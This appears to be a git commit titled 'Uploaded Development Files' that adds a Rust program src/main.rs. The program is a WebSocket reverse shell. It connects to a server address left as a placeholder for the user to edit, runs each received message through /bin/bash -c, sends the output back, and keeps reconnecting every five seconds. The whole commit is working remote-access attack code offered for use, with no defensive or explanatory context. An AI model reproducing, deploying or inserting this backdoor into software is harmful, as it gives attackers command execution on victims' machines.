7e384fea9838903dbed2fff3001d121538d2089f
zeref-security <77666064+zeref-security@users.noreply.github.com>
2022-01-07 03:41:21 +0000

    Uploaded Development Files

---
+++ src/main.rs
@@ -0,0 +1,34 @@
+extern crate ws;
+
+use ws::{connect, Handler, Sender, Handshake, Result, Message};
+use std::process::Command;
+use std::{thread, time};
+
+struct Client {
+    out: Sender
+}
+
+impl Handler for Client {
+
+    fn on_open(&mut self, _: Handshake) -> Result<()> {
+        self.out.send("new session started, connected.")
+    }
+
+    fn on_message(&mut self, msg: Message) -> Result<()> {
+        
+        let output =  Command::new("/bin/bash")
+               .arg("-c")
+               .arg(msg.as_text().unwrap())
+               .output()
+               .expect("");
+
+        self.out.send(output.stdout)
+    }
+}
+
+//Edit this before compiling
+fn main() {
+  connect("ws://127.0.0.1", |out| Client { out: out } ).unwrap();
+  thread::sleep(time::Duration::from_secs(5));
+  main()
+}
